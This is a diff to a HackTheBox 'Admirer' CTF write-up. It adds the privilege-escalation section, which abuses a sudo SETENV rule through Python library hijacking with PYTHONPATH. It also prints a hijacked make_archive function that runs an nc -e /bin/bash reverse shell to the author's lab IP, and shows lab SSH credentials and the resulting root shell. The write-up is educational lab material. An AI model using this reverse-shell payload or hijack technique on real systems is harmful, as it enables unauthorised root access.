@@ -170,7 +170,7 @@ admin
 w0rdpr3ss01!
 ```
 
-We know that ftp port is open and we found here a FTP acoount username and password!
+We know that ftp port is open and we found here a FTP account username and password!
 
 ```
 ┌─[root@hsn]─[/home/hsn/Desktop/ctf]
@@ -410,7 +410,7 @@ When you export it, you can see a new credentials here:
 ```password: &<h5b~yK3F#{PaPB&dA}{H>```
 
 But what is this credentials for? Remember that ssh port is open. Let's try it on ssh connection.
-
+```
 ┌─[✗]─[root@hsn]─[/etc/mysql/mariadb.conf.d]
 └──╼ #ssh waldo@10.10.10.187
 waldo@10.10.10.187's password: &<h5b~yK3F#{PaPB&dA}{H>
@@ -427,4 +427,240 @@ Last login: Thu Sep 17 02:01:23 2020 from 10.10.14.188
 waldo@admirer:~$ ls
 user.txt
 waldo@admirer:~$ cat user.txt
-dc8299f74427afdb15cf12ef73b34cee
+dc....f74427afdb15....ef7....cee
+```
+
+The privilage escalation is always hardest part for me! I hate this XD
+
+```
+waldo@admirer:~$ sudo -l
+[sudo] password for waldo: 
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+```
+Oh! This time I feel that it will be easy. We can execute ```/opt/scripts/admin_tasks.sh```
+
+```
+waldo@admirer:/home$ cd ..
+waldo@admirer:/$ ls
+bin   etc         initrd.img.old  lost+found  opt   run   sys  var
+boot  home        lib             media       proc  sbin  tmp  vmlinuz
+dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
+waldo@admirer:/$ cd root
+-bash: cd: root: Permission denied
+waldo@admirer:/tmp$ cd ..
+waldo@admirer:/$ cd opt
+waldo@admirer:/opt$ ls
+scripts
+waldo@admirer:/opt$ cd scripts/
+waldo@admirer:/opt/scripts$ ls
+admin_tasks.sh  backup.py
+waldo@admirer:/opt/scripts$ ls -la
+total 16
+drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
+drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
+-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
+-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 3
+no crontab for waldo
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 4
+Insufficient privileges to perform the selected operation.
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 5
+Insufficient privileges to perform the selected operation.
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Insufficient privileges to perform the selected operation.
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 7
+Insufficient privileges to perform the selected operation.
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 1
+up 9 hours, 43 minutes
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 2
+ 02:48:03 up  9:43,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+waldo    pts/0    10.10.14.188     02:01   43:05   0.06s  0.06s -bash
+waldo    pts/1    10.10.14.204     02:42    3.00s  0.11s  0.00s /usr/bin/w
+waldo@admirer:/opt/scripts$ ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 3
+no crontab for waldo
+
+I can't change admin_tasks.sh
+Nothing is working!
+```
+I was wrong! Nothing is working.
+
+When I searched “privilage escalation via python” I found this website:
+https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+
+I read it carefully and check ```admin_tasks.sh``` codes. I think that if I create a python file which can execute a netcat command, I can hijack ```admin_tasks.sh```.
+
+So I created a python file and write these codes and save it:
+```
+import os
+
+def make_archive(x, y, z):
+	os.system("nc 10.10.14.204 4444 -e '/bin/bash'")
+```
+When this file is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port.
+```
+┌─[✗]─[root@hsn]─[/home/hsn]
+└──╼ #nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+So, how to execute ```admin_tasks.sh``` via my simple python app. Here it is:
+```
+waldo@admirer:~/hsn$ sudo PYTHONPATH=~/hsn /opt/scripts/admin_tasks.sh
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+```
+Look at netcat!
+
+```
+┌─[✗]─[root@hsn]─[/home/hsn]
+└──╼ #nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.204] from (UNKNOWN) [10.10.10.187] 42248
+whoami
+root
+cd /
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd root
+ls
+root.txt
+cat root.txt
+867b....5400384e....0ed951....41
+```
+Yes, it is rooted!
+
+Many thanks to machine creators <a href="https://app.hackthebox.eu/users/159204">polarbearer</a> and <a href="https://app.hackthebox.eu/users/125033">GibParadox</a> and <a href="https://www.hackthebox.eu">HackTheBox</a> for this machine.
+
+If you think something is wrong, send a mail to hsnckkgl@gmail.com
+
+Best wishes to all the CTF Players,
+
+hsnckkgl
